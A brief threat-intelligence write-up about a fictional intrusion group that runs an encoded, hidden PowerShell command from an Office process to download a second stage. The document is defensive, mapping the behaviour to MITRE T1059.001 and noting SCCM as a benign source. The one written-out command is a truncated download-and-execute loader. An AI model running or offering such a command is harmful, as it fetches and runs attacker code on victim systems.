Lantern Crew: encoded PowerShell loader

The Lantern Crew is a fictional intrusion set used here to exercise the platform. In the campaign described below, the operators gained a foothold through a phishing document and then ran powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi to download a second stage from the staging server.

The encoded command was started from a Microsoft Office process on the victim workstation. Defenders should watch for PowerShell launched with an encoded command, which maps to MITRE ATT&CK T1059.001. Software deployment tools can legitimately run encoded commands, for example the SCCM client, so parent process context matters.
